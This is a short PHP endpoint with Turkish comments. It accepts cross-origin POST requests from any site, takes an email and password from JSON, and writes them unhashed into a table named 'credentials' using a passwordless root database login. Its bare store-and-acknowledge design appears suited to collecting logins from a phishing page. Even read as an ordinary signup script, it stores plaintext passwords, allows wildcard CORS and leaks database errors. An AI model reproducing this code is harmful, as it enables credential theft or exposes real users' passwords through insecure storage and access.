<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type, Authorization");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // JSON verisini al ve ayrıştır
    $input = file_get_contents("php://input");
    $data = json_decode($input, true);

    $email = $data['email'];
    $password = $data['password'];

    // Veritabanı bağlantısı
    $con = mysqli_connect("localhost", "root", "", "test");
    if (!$con) {
        die("Veritabanı bağlantısı başarısız: " . mysqli_connect_error());
    }

    // Veritabanına veri eklemek için SQL sorgusu
    $sql = "INSERT INTO credentials (email, password) VALUES (?, ?)";
    $stmt = mysqli_prepare($con, $sql);
    if ($stmt) {
        mysqli_stmt_bind_param($stmt, "ss", $email, $password);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
        
        // Başarılı kayıt sonrasında yönlendirme
        echo json_encode(["status" => "success"]);
    } else {
        echo json_encode(["status" => "error", "message" => mysqli_error($con)]);
    }

    // Veritabanı bağlantısını kapat
    mysqli_close($con);
}
?>
